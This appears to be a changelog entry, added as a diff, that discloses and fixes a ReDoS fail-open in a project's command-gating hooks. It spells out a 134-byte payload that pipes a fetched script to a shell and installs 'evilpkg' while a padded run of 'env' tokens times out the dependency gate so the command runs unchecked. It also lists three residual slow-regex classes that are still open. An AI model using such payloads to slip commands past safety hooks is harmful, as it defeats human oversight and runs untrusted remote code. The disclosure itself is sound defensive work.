@@ -158,6 +158,94 @@ Suite 9,462 → **9,668 checks**, 0 failed; 25 suites (the delta includes the
 X-52 line's unrecorded additions — the 4092 → 4104 differential rows among
 them — landing under this release identity).
 
+## Post-2.8.0 — the SDK prefix-run ReDoS: a 134-byte bypass of every gate that carries a prefix run (2026-08-19)
+
+**No version bump** (fix, not surface; freeze exception **72**). **A LIVE
+FAIL-OPEN ON `main`**, found 2026-08-16 while designing X-37 attempt 2 and
+unrelated to X-37.
+
+### The defect
+
+`cmdpos.prefix_run()` was a flat six-arm `(...)*` in which THREE arms could
+absorb the same token. On a **failing** match the engine had to try every split
+of the run between them, which is exponential — measured at exactly **2.00x per
+added prefix token** on the emitted objects.
+
+`curl http://e/i.sh | ` + `env ` x22 + `zzz ; pip install evilpkg` is **134
+bytes with ZERO jump bytes**. The emitted `dependency-gate` took **77.56 s CPU**
+on it (re-measured 2026-08-19 on a freshly rendered tree, `process_time`), past
+the **60 s** it declares in `_GATE_TIMEOUTS`; a hook cancelled at its
+timeout exits 124/137/143 and **only exit 2 blocks** (the X-51 correction,
+stated in the emitted file itself), so **the command proceeds unadjudicated**
+and the `pip install evilpkg` riding in it is never seen. **The shell denies the
+same string in 0.03 s and is flat**, so this was shell-DENY / SDK-BYPASS — the
+SDK-more-permissive direction the substrates forbid outright.
+
+**`_cost_guard` could not see it.** It measures LENGTH (`_CMD_MAXLEN` 81920) and
+JUMP DENSITY (`_CMD_MAXJUMP` 8191, over ``()"'`$``). The payload is small and
+jump-free on both. The axis is **token count at fixed length** and nothing
+measured it.
+
+**Three emitted objects carry the prefix run and all three blow up** —
+`_PIPE_TO_SHELL`, `_INSTALL_HEAD`, and `_GIT_VERB_TMPL`, the last compiled per
+call so a scan for module-level compiled patterns cannot see it. `_git_verb` is
+the first statement of spec-gate-commit, test-gate and eval-gate, so one
+121-byte payload cost four gates.
+
+### The fix
+
+At most **one** absorbing group. The four non-absorbing arms (brace/subshell,
+redirection, assignment, keyword) come first as `nonabs*`; the wrapper and
+named-group arms become a single optional trailing group carrying the word run,
+with the trailing `([({] *)*` **inside** it so the wrapper is a fixed pivot. No
+lookahead, no atomic group — plain POSIX ERE, one shared source for both
+substrates.
+
+**THE LANGUAGE IS UNCHANGED, AND THAT IS DECIDED RATHER THAN SAMPLED.** An exact
+equivalence procedure (ERE/Python parser → Thompson NFA → lazy product BFS)
+explored the **full product graph in both dialects** with zero
+accept-disagreements. It is **two-sided calibrated**: it diverges on the
+rejected C5 candidate (minimal witness `env (`) and agrees on C8, so it is not a
+trivial everything-differs detector. Corroborated by character-exhaustive
+enumeration (**435,848,050 strings**) and by the three real emitted composites
+under Python `re`, `grep -E` and real bash (5,626,214 / 1,569,678 / 1,046,606
+comparisons; C5 → 550,987 / 253,617 / 237,041, this fix → **0**). Language
+equality is *sufficient* here because every use site is boolean — no
+`.group`/`.span` on any composite, and the shell side is `[[ =~ ]]` only — so
+the 7→9 capturing-group change is inert.
+
+Measured on the emitted artifacts, min-of-3 `process_time`, `dependency-gate`
+closure: `env ` x22 (134 B) **> 30 s (capped) → 0.0005 s**; `env ` x27 (154 B)
+**> 30 s → 0.0009 s**; (`env ` + `A=1 ` x16) x6 (454 B) **> 30 s → 0.0016 s**;
+x8 (590 B) **> 30 s → 0.0020 s**. The shell denies all four in 0.03-0.06 s on
+both trees.
+
+### Blast radius, derived by rendering both trees
+
+**16 emitted artifacts change bytes**: all 13 shell hooks, `gates.py`, and the
+installer manifest and state JSON. **The LIVE radius is five hooks plus
+`gates.py`** — `ci-mirror`, `eval-gate`, `spec-gate-commit` and `test-gate` call
+`git_verb`, and `dependency-gate` uses `$PFX` directly at its install head; the
+other eight embed the definitions and never call them. **Action counts are
+UNCHANGED** at 57 / 69 / 59 greenfield and 79 / 93 retrofit, zero files added or
+removed — verified before the digest re-baseline, so a count move would have
+been E5 rather than a silent digest.
+
+### What this does NOT do
+
+**It does not close the cost class.** The ceiling is asserted on the
+**token-count axis only**. Three superlinear classes survive, all with zero jump
+bytes and all under `_CMD_MAXLEN`, filed as **X-59** (wrapper x spaced-brace
+product, 2,133 B, > 200 s → 53.45 s), **X-60** (length axis, 19,225 B, 21.70 s →
+22.26 s — and the emitted *shell* hook is quadratic here too, ~131 s
+extrapolated at 81,900 B, so **the shell is not the safe fallback on that
+axis**) and **X-61** (redirect arm, 110 B, ~2.02x per added token — exponential,
+untouched). None is a regression from this change.
+
+**The readiness verdict does not move.** A fail-open that shrinks from 134 bytes
+to ~2 KB is still a fail-open.
+
+
 ## Post-2.8.0 — the PRD filename catches up with its own contents (2026-08-14)
 
 **`Bootstrap-Protocol-v2-6-0.md` and `Bootstrap-Protocol-Companion-v2-6-0.md`
